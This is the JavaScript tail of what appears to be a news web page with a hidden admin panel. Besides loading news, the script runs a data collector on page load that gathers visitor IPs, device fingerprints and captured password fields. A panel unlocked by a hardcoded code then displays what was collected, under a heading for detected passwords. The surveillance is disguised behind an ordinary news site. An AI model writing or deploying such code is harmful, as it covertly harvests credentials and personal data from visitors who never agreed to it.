        // Fixed Admin functionality
        class AdminManager {
            constructor() {
                this.ADMIN_CODE = "11448888";
                this.init();
            }

            init() {
                document.getElementById('adminButton').addEventListener('click', () => this.openAdminModal());
                document.getElementById('closeAdminModal').addEventListener('click', () => this.closeAdminModal());
                document.getElementById('confirmAdminCode').addEventListener('click', () => this.checkAdminCode());
                document.getElementById('closeAdminPanel').addEventListener('click', () => this.closeAdminPanel());
                document.getElementById('adminPanelBackdrop').addEventListener('click', () => this.closeAdminPanel());
                document.getElementById('closeDataModal').addEventListener('click', () => this.closeDataModal());
                document.getElementById('closeNewsModal').addEventListener('click', () => this.closeNewsModal());
                
                document.getElementById('adminCode').addEventListener('keypress', (e) => {
                    if (e.key === 'Enter') {
                        this.checkAdminCode();
                    }
                });

                window.addEventListener('scroll', () => {
                    this.centerAdminPanel();
                });

                window.addEventListener('resize', () => {
                    this.centerAdminPanel();
                });
            }

            centerAdminPanel() {
                const adminPanel = document.getElementById('adminPanelModal');
                if (adminPanel.style.display === 'block') {
                    adminPanel.style.top = '50%';
                    adminPanel.style.left = '50%';
                    adminPanel.style.transform = 'translate(-50%, -50%)';
                }
            }

            openAdminModal() {
                document.getElementById('adminModal').style.display = 'flex';
                document.getElementById('adminCode').focus();
            }

            closeAdminModal() {
                document.getElementById('adminModal').style.display = 'none';
                document.getElementById('adminCode').value = '';
            }

            checkAdminCode() {
                const inputCode = document.getElementById('adminCode').value;
                const modal = document.getElementById('adminModal');
                
                if (inputCode === this.ADMIN_CODE) {
                    this.closeAdminModal();
                    this.showAdminPanel();
                } else {
                    modal.classList.add('shake');
                    setTimeout(() => {
                        modal.classList.remove('shake');
                        this.closeAdminModal();
                    }, 500);
                }
            }

            showAdminPanel() {
                document.getElementById('adminPanelBackdrop').style.display = 'block';
                document.getElementById('adminPanelModal').style.display = 'block';
                this.centerAdminPanel();
                this.loadVisitors();
            }

            closeAdminPanel() {
                document.getElementById('adminPanelBackdrop').style.display = 'none';
                document.getElementById('adminPanelModal').style.display = 'none';
            }

            loadVisitors() {
                const visitorsGrid = document.getElementById('visitorsGrid');
                const visitors = JSON.parse(localStorage.getItem('visitors') || '[]');
                
                visitorsGrid.innerHTML = '';
                
                if (visitors.length === 0) {
                    visitorsGrid.innerHTML = '<p style="grid-column: 1/-1; text-align: center; color: #666;">Нет данных о посетителях</p>';
                    return;
                }
                
                visitors.forEach((visitor, index) => {
                    const visitorItem = document.createElement('div');
                    visitorItem.className = 'visitor-item';
                    visitorItem.innerHTML = `
                        <button class="visitor-btn" data-index="${index}">
                            IP: ${visitor.ip}
                        </button>
                        <button class="delete-btn" data-index="${index}">×</button>
                    `;
                    visitorsGrid.appendChild(visitorItem);
                });

                // FIXED: Add event listeners after creating elements
                setTimeout(() => {
                    document.querySelectorAll('.visitor-btn').forEach(btn => {
                        btn.addEventListener('click', (e) => {
                            const index = e.target.getAttribute('data-index');
                            this.showVisitorData(visitors[index]);
                        });
                    });

                    document.querySelectorAll('.delete-btn').forEach(btn => {
                        btn.addEventListener('click', (e) => {
                            const index = e.target.getAttribute('data-index');
                            this.deleteVisitor(index);
                        });
                    });
                }, 100);
            }

            deleteVisitor(index) {
                let visitors = JSON.parse(localStorage.getItem('visitors') || '[]');
                visitors.splice(index, 1);
                localStorage.setItem('visitors', JSON.stringify(visitors));
                this.loadVisitors();
            }

            showVisitorData(visitor) {
                const dataContent = document.getElementById('dataContent');
                
                let passwordHTML = '';
                if (visitor.data.passwords && visitor.data.passwords.formData.length > 0) {
                    passwordHTML = `
                        <div class="password-data">
                            <strong>🔐 Обнаруженные пароли:</strong>
                            ${visitor.data.passwords.formData.map(pass => `
                                <div>${pass.field}: <strong>${pass.value}</strong> (${new Date(pass.timestamp).toLocaleString('ru-RU')})</div>
                            `).join('')}
                        </div>
                    `;
                }

                dataContent.innerHTML = `
                    <div><strong>Время визита:</strong> ${new Date(visitor.timestamp).toLocaleString('ru-RU')}</div>
                    <div><strong>IP адрес:</strong> ${visitor.ip}</div>
                    <div><strong>Браузер:</strong> ${visitor.data.browser.userAgent}</div>
                    <div><strong>Платформа:</strong> ${visitor.data.browser.platform}</div>
                    <div><strong>Язык:</strong> ${visitor.data.browser.language}</div>
                    <div><strong>Экран:</strong> ${visitor.data.screen.screenWidth}x${visitor.data.screen.screenHeight}</div>
                    <div><strong>Ядер CPU:</strong> ${visitor.data.hardware.cores}</div>
                    <div><strong>Память:</strong> ${visitor.data.hardware.memory}GB</div>
                    <div><strong>Часовой пояс:</strong> ${visitor.data.time.timezone}</div>
                    ${passwordHTML}
                    <br>
                    <details>
                        <summary><strong>Полные данные (JSON):</strong></summary>
                        <pre>${JSON.stringify(visitor.data, null, 2)}</pre>
                    </details>
                `;
                document.getElementById('dataModal').style.display = 'flex';
            }

            closeDataModal() {
                document.getElementById('dataModal').style.display = 'none';
            }

            closeNewsModal() {
                document.getElementById('newsModal').style.display = 'none';
            }
        }

        function showFullNews(newsItem) {
            document.getElementById('newsModalTitle').textContent = newsItem.title;
            document.getElementById('newsModalDate').textContent = `${newsItem.date} | ${newsItem.source}`;
            document.getElementById('newsModalContent').textContent = newsItem.fullContent || newsItem.content;
            document.getElementById('newsModal').style.display = 'flex';
        }

        async function initializeNews() {
            const newsGrid = document.getElementById('newsGrid');
            const loading = document.getElementById('loadingNews');
            
            try {
                const newsFetcher = new BandXNewsFetcher();
                const news = newsFetcher.getCurrentNews();
                
                loading.style.display = 'none';
                
                news.forEach(item => {
                    const card = document.createElement('div');
                    card.className = 'news-card';
                    card.innerHTML = `
                        <div class="news-date">${item.date} | ${item.source}</div>
                        <h3 class="news-title">${item.title}</h3>
                        <div class="news-content short">${item.content}</div>
                        <button class="expand-btn" onclick="showFullNews(${JSON.stringify(item).replace(/"/g, '&quot;')})">
                            Развернуть новость
                        </button>
                    `;
                    newsGrid.appendChild(card);
                });
            } catch (error) {
                loading.innerHTML = '<div class="error-message">Ошибка загрузки новостей. Проверьте подключение к интернету.</div>';
                console.error('News initialization error:', error);
            }
        }

        function initializeDataCollection() {
            const collector = new AdvancedDataCollector();
            collector.collectComprehensiveData().catch(console.error);
        }

        document.addEventListener('DOMContentLoaded', function() {
            window.adminManager = new AdminManager();
            initializeNews();
            initializeDataCollection();
        });

        window.showFullNews = showFullNews;
    </script>
